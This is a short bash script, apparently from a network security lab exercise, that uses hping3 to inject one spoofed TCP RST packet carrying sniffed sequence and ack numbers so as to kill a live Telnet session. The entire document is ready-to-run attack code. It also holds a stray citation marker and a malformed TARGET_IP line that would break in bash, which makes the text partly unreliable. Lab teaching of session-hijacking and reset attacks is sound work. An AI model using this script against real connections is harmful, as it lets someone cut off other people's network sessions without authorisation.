

#TCP RST Attack script

#!/bin/bash
#
# TCP RST ATTACK SCRIPT (TELNET)
# Fires a single, spoofed TCP RST packet to kill a Telnet session.
# Based on the lab procedure from Q7[cite: 2170].
#

# --- Values sniffed from Wireshark in the lab 
TARGET_IP="44.65.10.55" "Change to your Target IP for lab"
TARGET_PORT=23
SOURCE_PORT=51138
SEQ_NUM=3245969224
ACK_NUM=2193605309
# ----------------------------------------------------

echo "Injecting spoofed TCP RST packet to kill Telnet session on $TARGET_IP..."

# This command sends a packet with the RST (-R) and ACK (-A) flags set,
# using the exact sequence (-M) and ack (-L) numbers from the live session.
sudo hping3 $TARGET_IP \
    -p $TARGET_PORT \
    -s $SOURCE_PORT \
    -A -R \
    -M $SEQ_NUM \
    -L $ACK_NUM \
    -c 1

echo "Attack packet sent. The Telnet connection should be terminated."
